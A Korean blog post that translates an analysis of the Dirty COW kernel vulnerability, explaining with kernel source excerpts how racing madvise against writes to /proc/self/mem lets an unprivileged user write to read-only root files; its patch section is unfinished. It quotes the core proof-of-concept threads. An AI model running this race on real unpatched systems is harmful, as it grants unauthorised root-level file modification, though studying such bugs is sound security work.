---
title: Pwnable - Dirty Cow
categories:
 - pwnable, kernel, analysis, translation
tags: pwn, kernel, exploit, page, Copy-on-Write
---

---

최신 문제를 풀고 싶은데 현재 환경상 glibc 2.29 문제나 kernel 문제는 못 풀기때문에 커널 CVE 분석글을 보면서 어느정도 커널 exploit에 발을 들이기로 했다. 문제 푸는 것도 아주 놓을 수는 없어서 문제도 간간이 풀면서 분석글을 포스팅 하려고 한다. 

원래는 휴가를 나가려고 해서 좀 쉬고 힐링 타임을 가지려고 했지만... ~~코로나 개색...~~

약 4년전에 나온 kernel cve `Dirty Cow`에 대해 알아보도록 하겠다.

본 분석글은 TLS를 분석할때 참고했던 `https://chao-tic.github.io/blog/2017/05/24/dirty-cow`의 게시글중에 `Dirty Cow`에 대해 정말 잘 정리되어 있는 글을 발견해서 번역 해서 포스팅하는 방향으로 진행하도록 하겠다.

시간이 없거나 한글이 편한 분들은 이 글을 읽는 것을 추천한다.   ~~영어 잘하면 이 글 읽지말고 원문만 보는 걸 추천합니다~~

영어실력이 딸리기 때문에 필자의 오역이 많이 들어갈 수 있으니 양해의 말을 미리 구한다.




---


## Introduction

(Dirty COW에 대한)익스에 관한 많은 기사나 블로그 글이 있지만 정확히 Dirty COW가 커널 관점에서 어떻게 동작하는지에 대한 만족스러운 설명이 없어 포스팅을 진행하기로 했다. 

본 분석은 `https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c`의 POC를 기반으로 작성했다. 

위의 예시 코드가 익스치고는 꽤 짧은데 중요한 부분은 `/proc/self/mem`에 `write`를 호출하는 쓰레드와 `madvise(MADV_DONTNEED)`를 호출하는 쓰레드다. 이 두 쓰레드가 서로 경쟁하게 해서 기본 메모리 맵에 쓰기권한이 없는 파일이 매핑된 경우에도 직접 수정하기 위한 `write`를 할 수 있게 된다.

본 포스팅은 꽤 기술적으로 무거우니 아래의 개념을 숙지한 상태의 독자라 가정하고 진행하도록 하겠다.

- Virtual Memory
- Pages
- Page Fault
- Copy-on-Write

## How to carry out the attack

그럼, 처음부터 시작해보도록 하자. 우리의 궁극적인 목적은 파일에 `write`를 하는 것이지만 첫 코드에서 파일에 `open`를 호출할때 read-only인 `O_RDONLY` flag를 인자로 넣는다. 이렇게 하는 이유는 해당 파일에 쓰기권한이 없기때문에 fd를 가져올때 커널을 만족시키기 위한 것이다. 이렇게 fd를 가져오는데 성공하면 즉시 `mmap`을 호출한다.


```c
	f=open(argv[1],O_RDONLY);
	fstat(f,&st);
	name=argv[1];
	/*
	You have to use MAP_PRIVATE for copy-on-write mapping.
	> Create a private copy-on-write mapping.  Updates to the
	> mapping are not visible to other processes mapping the same
	> file, and are not carried through to the underlying file.  It
	> is unspecified whether changes made to the file after the
	> mmap() call are visible in the mapped region.
	*/
	/*
	You have to open with PROT_READ.
	*/
	map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
```

`mmap`을 호출하면 해당 프로세스의 가상 주소 공간에 매핑된 파일 기반 읽기 전용 메모리를 생성한다. 이렇게 생성된 메모리는 `vm_area_struct`(Virutal Memory Area)라 불리는 커널 객체에 의해 관리된다. (해당 커널 객체에는 매핑을 지원하는 기본 파일 설명, 매핑된 페이지에 대한 읽기/쓰기 권한 등의 정보들이 들어있음)

그리고나서 `madvise`와 `write`를 수행하는 두개의 경쟁 쓰레드가 생성된다.

```c
    pthread_create(&pth1,NULL,madviseThread,argv[1]);
    pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
```

그럼 `madvise`를 호출하는 쓰레드 먼저 다뤄보도록 하겠다.

```c
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
```

기본적으로 `madvise(MADV_DONTNEED)`는 매핑에 의해 관리되는 물리 메모리를 제거한다. Copy-On-Write된 페이지의 경우에는 함수 호출 후 페이지가 지워진다. 그 후 사용자가 해당 메모리 영역을 다시 접근하려고 하면 파일 기반 매핑을 위해 디스크 (또는 페이지 캐시)에서 기존 내용이 다시 로드되거나 0으로 채워진 익명 힙 메모리가 로드된다.

리눅스 문서를 참조해보면

```
       `MADV_DONTNEED`
              Do not expect access in the near future.  (For the time being,
              the application is finished with the given range, so the
              kernel can free resources associated with it.)

              After a successful MADV_DONTNEED operation, the semantics of
              memory access in the specified region are changed: subsequent
              accesses of pages in the range will succeed, but will result
              in either repopulating the memory contents from the up-to-date
              contents of the underlying mapped file (for shared file
              mappings, shared anonymous mappings, and shmem-based
              techniques such as System V shared memory segments) or zero-
              fill-on-demand pages for anonymous private mappings.

              Note that, when applied to shared mappings, MADV_DONTNEED
              might not lead to immediate freeing of the pages in the range.
              The kernel is free to delay freeing the pages until an
              appropriate moment.  The resident set size (RSS) of the
              calling process will be immediately reduced however.

              MADV_DONTNEED cannot be applied to locked pages, Huge TLB
              pages, or VM_PFNMAP pages.  (Pages marked with the kernel-
              internal VM_PFNMAP flag are special memory areas that are not
              managed by the virtual memory subsystem.  Such pages are
              typically created by device drivers that map the pages into
              user space.)
```

라고 되어있다. 리눅스에서 `MADV_DONTNEED`의 동작은 사실 논란의 여지가 있고 POSIX 표준 1을 준수하지 않는다. 곧 알 수 있겠지만 실제로 이 동작 때문에 Dirty COW exploit이 가능해진다.

그럼 다른 쓰레드를 살펴보자.

```c
void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    /*
       You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
       >  The in the wild exploit we are aware of doesn't work on Red Hat
       >  Enterprise Linux 5 and 6 out of the box because on one side of
       >  the race it writes to /proc/self/mem, but /proc/self/mem is not
       >  writable on Red Hat Enterprise Linux 5 and 6.
     */
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<100000000;i++) {
        /*
           You have to reset the file pointer to the memory position.
         */
        lseek(f,(uintptr_t) map,SEEK_SET);
        c+=write(f,str,strlen(str));
    }
    printf("procselfmem %d\n\n", c);
}
```

먼저 `lseek`으로 `map`의 주소를 세팅한다. 그리고 아마 읽기 전용일 파일의 메모리 매핑에 속한 메모리 영역을 직접 수정을 하기 위해 `wirte`를 호출한다..?? 그리고나선 아무튼 뭐 그 수정된 것이 읽기 권한밖에 없는 파일에 전달되겠지?? 대체.. 어떻게??

## write on /proc/{pid}/mem

`/proc/{pid}/mem`은 프로세스에 일종의 out-of-band 메모리 접근을 제공하는 `pseudo file`(가상 파일)이다. 이런 유형의  접근 방식의 또 다른 예로 `ptrace`가 있다. `ptrace`는 Dirty Cow의 대체 공격 벡터로 사용가능하다.

`/proc/self/mem`에 write를 했을 때 동작을 살펴보기 위해 커널 영역에 땅굴이 필요하다. 먼저 `write` 함수가 이 가상파일(`/proc/self/mem`)에 어떻게 구현되어 있는지 확인해보자.

커널영역에서는 파일 시스템 동작이 OOP style로 구현되어 있다. 추상 인터페이스 `struct file_operations`가 한개 존재하고 다른 파일 형식들은 해당 인터페이스에 대해 세부적인 파일 작업 구현을 제공할 수 있다. `/proc/{pid}/mem`의 경우, `/fs/proc/base.c`에서 정의된 것을 찾을 수 있었다.

```c
static const struct file_operations proc_mem_operations = {
    .llseek  = mem_lseek,
    .read    = mem_read,
    .write   = mem_write,
    .open    = mem_open,
    .release = mem_release,
};
```

가상 파일에 `write`를 호출할 때 커널은 해당 작업을 `mem_write`로 라우팅시킨다. `mem_write`는 대부분의 작업을 수행하는 `mem_rw`을 래핑하는 역할을 한다. (실질적인 수행은 `mem_rw`에서 함.)

```c
static ssize_t mem_rw(struct file *file, char __user *buf, size_t count, loff_t *ppos, int write)
{
    struct mm_struct *mm = file->private_data;
    unsigned long addr = *ppos;
    ssize_t copied;
    char *page;

    if (!mm)
        return 0;

    /* allocate an exchange buffer */
    page = (char *)__get_free_page(GFP_TEMPORARY);
    if (!page)
        return -ENOMEM;

    copied = 0;
    if (!atomic_inc_not_zero(&mm->mm_users))
        goto free;

    while (count > 0) {
        int this_len = min_t(int, count, PAGE_SIZE);

        /* copy user content to the exchange buffer */
        if (write && copy_from_user(page, buf, this_len)) {
            copied = -EFAULT;
            break;
        }

        this_len = access_remote_vm(mm, addr, page, this_len, write);
        if (!this_len) {
            if (!copied)
                copied = -EIO;
            break;
        }

        if (!write && copy_to_user(buf, page, this_len)) {
            copied = -EFAULT;
            break;
        }

        buf += this_len;
        addr += this_len;
        copied += this_len;
        count -= this_len;
    }
    *ppos = addr;

    mmput(mm);
free:
    free_page((unsigned long) page);
    return copied;
}
```

함수의 시작부분에서 호출 프로세스(write를 수행하는 프로세스)와 호출되는 프로세스(`/proc/self/mem`이 쓰여진 프로세스)의 사이에서 일종의 데이터 교환 센터로써 쓰이는 임시 메모리 버퍼를 할당한다. 이 경우에는 두 프로세스가 같은 프로세스이지만 일반적으로 호출 프로세스와 호출되는 프로세스가 서로 다르고, 다른 프로세스에 직접 접근할 수 없는 경우에는 임시 메모리 버퍼를 할당하는 동작이 무척 중요하다.

그 다음에 `copy_from_user`를 사용하여 호출 프로세스의 유저 버퍼(`buf`)를 새로 할당된 `page` 버퍼에 복사한다.

이러한 준비가 완료되면 `write`의 동작인 `access_remote_vm`이 수행된다. 이름에서 알 수 있듯이 `access_remote_vm`는 커널이 다른(원격) 프로세스의 가상 메모리 주소를 읽거나 쓰는 것을 허용해준다. 이는 out-of-band 메모리 접근 방식에 기초를 두고 있다. (e.g. `ptrace`, `/proc/self/mem`, `process_vm_readv`, `process_vm_writev`, 등.)

`access_remote_vm`는 최종적으로 `__get_user_pages_locked(...)`에 도달하게 되는 몇개의 중간 함수를 호출한다. 해당 함수들은 먼저 out-of-band 접근의 의도를 `flags` 형식으로 변환시킨다. 이 경우에 `flags`들은 

- FOLL_TOUCH
- FOLL_REMOTE
- FOLL_GET
- FOLL_WRITE
- FOLL_FORCE

로 구성되어 있다.

위의 flag들은 `gup_flags` (Get User Pages flags)나 `foll_flags` (Follow flags)라고도 불리며 해당 flag는 호출자가 왜 유저 메모리 페이지에 접근하는지 그리고 어떤 방식으로 접근을 원하는지, 어떻게 가져 가려는지에 대한 정보를 인코딩한다. 이제부터 이걸 `access semantics`(접근 의미론)이라고 부르도록 하겠다.

이 `flags`와 다른 매개변수들이 `__get_user_pages`함수에 넘어가면서 실제 원격 프로세스 메모리 접근을 시작 한다.

## __get_user_pages and faultin_page

`__get_user_pages`의 목적은 주어진 가상 주소 범위(원격 프로세스의 주소 공간)를 찾아 커널영역에 고정시키는 것이다. 고정을 시키지 않으면, 해당 유저 페이지가 메모리 안에서 존재할 수 없게 된다.

어떤 식으로든 `__get_user_pages`는  커널영역에서 사용자 공간의 메모리 접근을 하는 것을 시뮬레이션하고 `faultin_page`를 이용해 page fault 처리를 완료한다.

관련없는 부분은 없앤 `__get_user_pages` 코드다.

```c
long __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,
		unsigned long start, unsigned long nr_pages,
		unsigned int gup_flags, struct page **pages,
		struct vm_area_struct **vmas, int *nonblocking)
{
	/* ... snip ... */

	do {
        /* ... snip ... */
retry:
		cond_resched(); /* please rescheule me!!! */
		page = follow_page_mask(vma, start, foll_flags, &page_mask);
		if (!page) {
			int ret;
			ret = faultin_page(tsk, vma, start, &foll_flags,
					nonblocking);
			switch (ret) {
			case 0:
				goto retry;
			case -EFAULT:
			case -ENOMEM:
			case -EHWPOISON:
				return i ? i : ret;
			case -EBUSY:
				return i;
			case -ENOENT:
				goto next_page;
			}
			BUG();
		} 
		if (pages) {
			pages[i] = page;
			flush_anon_page(vma, page, start);
			flush_dcache_page(page);
			page_mask = 0;
		}
        /* ... snip ... */
    }
	/* ... snip ... */
}
```


코드를 보면 먼저 `start`주소에서 메모리 접근 의미론(access semantics)가 인코딩된 `foll_flags`를 이용해 원격 프로세스의 메모리 페이지를 탐색한다. 만약 페이지를 사용할 수 없으면(`page == NULL`) 페이지가 존재하지 않거나 접근을 위해 page fault를 처리해야 될수도 있다고 가정한다. 따라서 `faultin_page`가 `start`주소와 함께 `foll_flags`를 이용해 호출되며, 유저 메모리 접근을 시뮬레이션 하고 핸들러가 누락된 페이지를 페이징 시키기 위해 page fault 핸들러를 트리거한다.

`follow_page_mask`가 `NULL`을 리턴하는 몇 가지 이유가 있는데, 완전하진 않은 리스트를 소개하겠다.

- `NULL` 포인터 접근과 같이 해당 주소에 메모리 매핑이 없는 경우
- 메모리 매핑이 생성되었지만 `demand-paging` 때문에 아직 내용이 로드되지 않은 경우
- 페이지가 기존 파일이나 대체 파일로 paged out 된 경우
- `foll_flags`에 인코딩된 접근 의미론(access semantics)이 페이지의 사용 권한을 위반했을 경우(i.e. 읽기전용 매핑에 쓰기를 요청하기)

여기서 맨 마지막 경우가 `/proc/self/mem`에 `write`를 할 때 발생하는 경우와 완전히 일치한다.

만약 page fault 핸들러가 해당 fault를 성공적으로 해결하고 아무런 문제도 제기하지 않는다면 해당 기능은 유효한 페이지를 가지고 작업하기를 바라면서 또 다른 재시도를 할 것이다. => 뭔소리야..

`retry` 레이블과 `goto` 구문의 사용을 확인해보고 넘어가라. 해당 구문은 exploit에 중대한 역할을 한다.

그걸 염두해두고, `faultin_page`를 좀 더 가까이 살펴보자.

```c
static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
		unsigned long address, unsigned int *flags, int *nonblocking)
{
	struct mm_struct *mm = vma->vm_mm;
	unsigned int fault_flags = 0;
	int ret;

	/* mlock all present pages, but do not fault in new pages */
	if ((*flags & (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)
		return -ENOENT;
	/* For mm_populate(), just skip the stack guard page. */
	if ((*flags & FOLL_POPULATE) &&
			(stack_guard_page_start(vma, address) ||
			 stack_guard_page_end(vma, address + PAGE_SIZE)))
		return -ENOENT;
	if (*flags & FOLL_WRITE)
		fault_flags |= FAULT_FLAG_WRITE;
	if (*flags & FOLL_REMOTE)
		fault_flags |= FAULT_FLAG_REMOTE;
	if (nonblocking)
		fault_flags |= FAULT_FLAG_ALLOW_RETRY;
	if (*flags & FOLL_NOWAIT)
		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;
	if (*flags & FOLL_TRIED) {
		VM_WARN_ON_ONCE(fault_flags & FAULT_FLAG_ALLOW_RETRY);
		fault_flags |= FAULT_FLAG_TRIED;
	}

	ret = handle_mm_fault(mm, vma, address, fault_flags);
	if (ret & VM_FAULT_ERROR) {
		if (ret & VM_FAULT_OOM)
			return -ENOMEM;
		if (ret & (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))
			return *flags & FOLL_HWPOISON ? -EHWPOISON : -EFAULT;
		if (ret & (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))
			return -EFAULT;
		BUG();
	}

	if (tsk) {
		if (ret & VM_FAULT_MAJOR)
			tsk->maj_flt++;
		else
			tsk->min_flt++;
	}

	if (ret & VM_FAULT_RETRY) {
		if (nonblocking)
			*nonblocking = 0;
		return -EBUSY;
	}

	/*
	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when
	 * necessary, even if maybe_mkwrite decided not to set pte_write. We
	 * can thus safely do subsequent page lookups as if they were reads.
	 * But only do so when looping for pte_write is futile: in some cases
	 * userspace may also be wanting to write to the gotten user page,
	 * which a read fault here might prevent (a readonly page might get
	 * reCOWed by userspace write).
	 */
	if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
		*flags &= ~FOLL_WRITE;
	return 0;
}
```

함수의 전반부는 `foll_flags`를 page fault 핸들러 `handle_mm_fault`가 이해할 수 있는 `fault_flags`로 변환한다. `handle_mm_fault`는 `__get_user_pages`가 계속 실행할 수 있게 page fault를 책임지고 해결한다.

이 경우에는 우리가 수정하려는 원본 메모리 매핑 부분이 읽기전용이기 때문에 `handle_mm_fault`는 원본의 권한 구성을 준수하고 우리가 쓰고자 하는 주소에 대한 새로운 읽기 전용 COW 페이지(`do_wp_page`)를 만든다. 이 때 페이지는 private으로 마치 자기꺼라고 침발라 놓는 느낌으로 표시를 해주기 때문에 Dirty Cow로 불린다.

COW된 페이지를 생성하는 실제 코드는 핸들러 깊숙히 내장된 `do_wp_page`이지만, 대략적인 코드 흐름은 공식 Dirty Cow page에서 찾아볼 수 있다.(`https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails`)

```
faultin_page
  handle_mm_fault
    __handle_mm_fault
      handle_pte_fault
        FAULT_FLAG_WRITE && !pte_write
      do_wp_page
        PageAnon() <- this is CoWed page already
        reuse_swap_page <- page is exclusively ours
        wp_page_reuse
          maybe_mkwrite <- dirty but RO again
          ret = VM_FAULT_WRITE
```

이제 다시 `faultin_page`의 끝부분으로 돌아가 보면, 함수가 리턴되기 바로 전에 실제로 exploit을 가능하게하는 동작을 한다.

```c
	/*
	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when
	 * necessary, even if maybe_mkwrite decided not to set pte_write. We
	 * can thus safely do subsequent page lookups as if they were reads.
	 * But only do so when looping for pte_write is futile: in some cases
	 * userspace may also be wanting to write to the gotten user page,
	 * which a read fault here might prevent (a readonly page might get
	 * reCOWed by userspace write).
	 */
	if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
		*flags &= ~FOLL_WRITE;
    return 0;
```

Copy on Write가 발생한 것(`ret & VM_FAULT_WRITE == true`)을 감지하고 나서 `foll_flags`에서 `FOLL_WRITE`를 제거하기로 결정한다. 띠용? 왜...?

혹시 `retry` 레이블을 기억하는가? 만약 `FOLL_WRITE`가 제거되지 않으면 그 다음 재시도 또한 정확히 똑같은 코드 루트를 따라가게 될것이다. 그 이유는 새롭게 생겨난 COW된 페이지가 원본 페이지와 동일한 접근 권한(읽기전용)을 가지고 있기 때문이다. 동일한 접근 권한, 동일한 `foll_flags`, 동일한 재시도... 이 때문에 루프를 돌게 된다.

이 뫼비우스의 띠를 탈출하기 위해 적용한 아이디어는 다음 재시도된 `follow_page_mask`의 호출이 `start`주소를 가리키는 유효한 페이지를 리턴할 수 있게 쓰기 의미론(write semantics)를 제거하는 것이었다. 이렇게 되면 `FOLL_WRITE`가 없어졌기 때문에 `foll_flags`는 COW된 읽기 전용 페이지에 의해 허용된 일반적인 읽기 액세스에 불과해졌다.

## The lie

문제의 요점을 정리해보도록 하겠다. `foll_flags`에서 쓰기 의미론(write semantics)를 제거함으로써 다음 재시도 하는 `follow_page_mask`는 함수 호출의 목적이 쓰기임에도 불구하고 읽기전용 접근으로 처리를 해버린다.

이와 동시에 COW된 페이지가 다른 쓰레드의 `madvise(MADV_DONTNEED)`으로 인해 드랍되버리면 어떻게 될까?

바로 무서운일이 일어나..진 않는다. `follow_page_mask`는 `madvise` 덕분에 현재 제거되어 부재중인 COW된 페이지때문에 여전히 해당 주소의 페이지를 찾지 못한다. 하지만 그 다음 `faultin_page`에서 일어나는 일은 좀 흥미롭다.

이번에는 `foll_flags`가 `FOLL_WRITE`를 포함하고 있지 않기 때문에 dirty COW 페이지를 생성하는 것 대신에 `handle_mm_fault`가 간단하게 페이지 캐시에서 기본 특권 파일에 직접 매핑되는 페이지를 꺼낸다. 왜 바로 꺼낼까? 커널이 오직 읽기에 대한 접근을 물어봤기 때문에(`FOLL_WRITE`가 없어진걸 참고해라), 커널이 이미 수정하지 않겠다고 약속하는데 왜 굳이 귀찮게 페이지의 다른 복사본을 만들려고 하겠는가? 

이 `faultin_page` 직후에 , `__get_user_pages`가 여러번 요청해 온 페이지를 얻기위해 또 한 번 재시도를 할것이다. `follow_page_mask` 덕분에 이 재시도에서 마침내 페이지를 리턴해준다. 그리고 리턴된 페이지는 평범한 페이지가 아닌 권한있는 파일과 직접 연결된 기본 페이지이다.

커널이 우리한테 문을 열 수 있는 키를 줘버렸네..? 이 페이지만 있으면, 하등한 천민인 non-root 프로그램이 이젠 루트 파일을 수정할 수 있게된다.

이렇게 된 이유는 커널이 거짓말을 해서 그렇다.~~구라치다 걸리면..~~ Dirty Cow 페이지가 준비되고난 이후 재시도를 할때 `follow_page_mask`와 `handle_mm_fault`한테 읽기 전용 액세스만 필요하다고 말했다. 이 두 함수는 기쁘게 응하고 작업에 제일 적합한 페이지를 반환한다. 이경우에 수정을 수행하면 원본 특권 파일에도 똑같이 수정이 되는 페이지를 반환하게 된다.

`page`를 손에 넣은 후 `__get_user_pages`는 마침내 `faultin_page` 호출을 건너뛰고 이후 추가처리를 위한 `__access_remote_vm`에 사용될 `page`를 반환한다. 


## The massacre

그럼 `page`가 정확히 어떻게 수정되겠는가? 여기 관련된 `access_remote_vm`의 코드 단편이 있다.

```c
    maddr = kmap(page);
    if (write) {
        copy_to_user_page(vma, page, addr,
                  maddr + offset, buf, bytes);
        set_page_dirty_lock(page);
    } else {
        /* ... snip ... */
    }
    kunmap(page);
```

위의 코드 단편의 `page`는 전에 우리가 언급했던 직접 매핑된 페이지이다. 먼저 커널은 `kmap`으로 커널 자신의 주소공간에 해당 페이지를 가져온다. 그 후 즉시 `copy_to_user_page`를 호출함으로써 `buf`에 있는 사용자 데이터를 언급한 페이지에 `write`를 한다.

결국 얼마 지나서 오염된 페이지는 kernel write-back daemon(`kflushd`, `bdflush`, `kupdated`, `pdflush` threads...)나 명시적으로 `sync`나 `fsync`를 호출함으로써 디스크에 존재하는 특권 파일에 다시 쓰기를 하게된다. 그렇게 되면 이제 공격이 완성된다.

이런 의문이 들 수도 있겠다. 얼마나 해당 exploit의 범용성이 클까? 이게 커널 공간에서 일어나고 있는 거지? 그리고 커널이 쓰레드가 언제 실행될지 결정할 권리가 있을까?

안타깝게도 너도 대강 추측은 하고 있을 것이다. 답은 범용성은 꽤 크다. Dirty Cow는 `__get_user_pages`가 명시적으로 각 재시도마다 `cond_resched`을 호출함으로써 작업관리자에게 필요한 경우 다른 쓰레드로 전환하도록 요청하고 있기 때문에 싱글 코어 프로세서에서도 상당히 안정적으로 트리거될 수 있다.

두 쓰레드가 어떻게 race 경쟁을 하는 지 보자.

```
+-----------------------------------------------------------------+
|        madvise Thread         |     /proc/self/mem Thread       |
+-----------------------------------------------------------------+
|                               |                                 |
|                               |      write("/proc/self/mem")    |
|                               |                ↓                |
|                               |        mem_rm(write=true)       |
|                               |                ↓                |
|                               |        access_remote_vm()       |
|                               |                ↓                |
|                               |        __get_user_pages()       |
|                               |                ↓                |
|                               |           faultin_page          |
|                               |                ↓                |
|                               |         Drops FOLL_WRITE        |
|                               |                ↓                |
|                               |           cond_resched()        |
|                               |                                 |
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
|                               |                                 |
|     madvice(MADV_DONTNEED)    |                                 |
|               ↓               |                                 |
|       zap_page_range(...)     |                                 |
|               ↓               |                                 |
|      Drops Dirty COWed page   |                                 |
|                               |                                 |
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
|                               |                                 |
|                               |       Begins another retry      |
|                               |                ↓                |
|                               | follow_page_mask(no FOLL_WRITE) |
|                               |                ↓                |
|                               |   Get page directly mapped to   |
|                               |        the priviliged file      |
|                               |                                 |
+-----------------------------------------------------------------+

```

## Hang on, but why do we have that dirty COW page in the first place again?

눈치빠른 독자라면 눈치챘겠지만 우리가 읽기전용 파일 기반 매핑에 직접적으로 액세스를 했다면 우리 얼굴에 세그먼트 오류가 던져졌을 것이다. 하지만 왜 우리가 `/proc/self/mem`에 `write`를 하게되면 dirty COW된 페이지를 얻을 수 있을까?

그 이유는 in-process direct 메모리/포인터 액세스와 `ptrace`나 `/proc/{pid}/mem`을 사용한 out-of-band 메모리 액세스 할때 커널이 page fault를 어떻게 처리하냐에 있다.

두 경우 모두 최종적으로 page fault를 해결하기 위해 `handle_mm_fault`를 호출한다. 하지만 `faultin_page`를 사용하여 page fault를 시뮬레이션하는 후자와는 다르게 직접 액세스로 발생되는 page fault는 MMU에 의해 트리거되고 interrupt 핸들러를 거쳐 플랫폼 종속 커널 함수인 `__do_page_fault`까지 전달된다.

읽기 전용 메모리 영역에 직접 write하는 경우에는 해당 핸들러가 `access_error`에서 액세스 위반을 감지하고 `handle_mm_fault`에 도달하기 전에 `bad_area_access_error`안에서 주저없이 `SIGSEGV`를 뿌려버린다.

```c
static noinline void
__do_page_fault(struct pt_regs *regs, unsigned long error_code,
        unsigned long address)
{
    /* ... snip ... */

    if (unlikely(access_error(error_code, vma))) {
        /* Let's skip handle_mm_fault, here comes SIGSEGV!!! */
        bad_area_access_error(regs, error_code, address, vma);
        return;
    }

    /* I'm here... */
    fault = handle_mm_fault(mm, vma, address, flags);

    /* ... snip ... */
```

반면 `faultin_page`는 마지못해 법과 질서를 유지하기 위해서 dirty COW된 페에지를 생성함으로써 해당 액세스 위반을 처리한다.(생성된 페이지도 결국 읽기 전용이며 커널조차도 직접 매핑된 페이지를 강제적으로 반환할 수 없다) 커널을 신뢰하는 것은 세그먼트 오류 없이 액세스를 위반하는 완벽한 이유가 있다.

왜 커널은 이런 종류의 out-of-band 접근에 그러한 페이지를 주는가? 왜 커널은 한 프로그램이 다른 프로세스의 신성시 되는 메모리 공간을 간섭하는 그런 침입하는 방법을 허용하는 것인가?

이에 간단히 답을 해주자면 모든 프로세스의 메모리 공간은 신성하고 개인 공간또한 중요하다. 하지만 여전히 디버거나 몇몇 다른 수사하는 프로그램들은 원격 프로세스의 데이터를 가져올 방법이 필요하다. 디버거가 너의 프로그램에 브레이크 포인트와 변수를 보는 것이 어떻게 가능한지 생각해봐라.

## The patch

픽스는 꽤 짧았다. 이하 전체적으로 달라진 내용이다.

{% gist 3d11e77ecd66ddd1c4f6b84595d8b89c %}

posting..





## Reference

```
https://chao-tic.github.io/blog/2017/05/24/dirty-cow
```
























Posting..
